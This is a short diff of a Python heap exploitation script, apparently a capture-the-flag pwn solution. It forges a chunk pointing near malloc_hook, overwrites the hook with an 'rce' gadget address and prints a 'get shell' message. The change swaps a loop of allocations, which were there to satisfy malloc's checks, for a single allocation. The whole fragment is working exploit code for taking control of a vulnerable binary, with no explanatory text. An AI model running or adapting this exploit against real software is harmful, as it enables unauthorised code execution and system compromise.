@@ -92,11 +92,7 @@ cancel(1)
 cancel(0)
 create("R"*0x100+p64(0x100)+p64(0x71)+p64(malloc_hook-35),0x300) #new 0
 
-#just to make the structure around main_arena "align"
-#to bypass the malloc checking
-for i in range(1,11):
-    create("QQQQ",0x10*i)
-
+create("QQQQ",0x50)
 create("A"*3+p64(rce)*4,0x50)
 print "[+]get shell :)"
 r.sendline("0")
